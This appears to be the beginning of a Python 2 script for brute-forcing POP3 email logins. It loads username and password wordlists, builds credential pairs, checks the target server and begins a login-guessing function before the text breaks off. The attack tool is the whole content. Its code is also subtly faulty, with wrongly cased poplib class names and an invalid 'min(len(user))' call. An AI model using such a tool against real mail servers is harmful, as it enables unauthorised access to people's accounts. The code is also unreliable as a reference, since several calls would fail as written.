#!/usr/bin/env python
# coding=utf-8
import threadpool
import time
import poplib
import sys
import optparse

user = []
pswd = []
user_pass = []
payload_number = 0
get_result = []
user_path = ""
pswd_path = ""
domain_intruded = ""
port_intruded = ""
thread_numbers = 0
delay_time = 0
pass_check_type = False
auto_extract_domain = False
remove_suffix = False


def checkserver(domain):
    #check the connection about server
    try:
        if port_intruded == 995:
            pop_chk = poplib.pop3_SSL(domain,port_intruded)
        else:
            pop_chk = poplib.pop3(domain,port_intruded)

        pop_chk.quit()
        return True
    except Exception,e:
        print "\n[+] Error:%s" %(e)
        return False

def print_result(request, result):
    print '-'*70
    print result

def dict_processing():
    try:
        global payload_number
        user_file = open(user_path,'r')
        for user_line in user_file.readlines():
            if len(user_line.strip()) > 1 :
                user.append(user_line)
        pass_file = open(pswd_path,'r')
        for pass_line in pass_file.readlines():
            if len(pass_line.strip()) > 1:
                pswd.append(pass_line)


        # if try to all user/pass combination
        if pass_check_type:
            for username in user:
                for password in pswd:
                    info = "%s:%s" %(username.strip(),password.strip())
                    user_pass.append(info)
                    payload_number += 1

        else:
            for i in range(min(len(user))):
                info = "%s:%s" %(user[i].strip(),pswd[i].strip())
                user_pass.append(info)
                payload_number += 1
        user_file.close()
        pass_file.close()

    except Exception,e:
        print "[-] Error : %s\n" %(e)
        sys.exit(1)

def mailbruteforce(login_info):
    try:
        u_pass = login_info.split(":")
        login_user = u_pass[0].strip()
        login_pswd = u_pass[1].strip()
        server_checked = domain_intruded



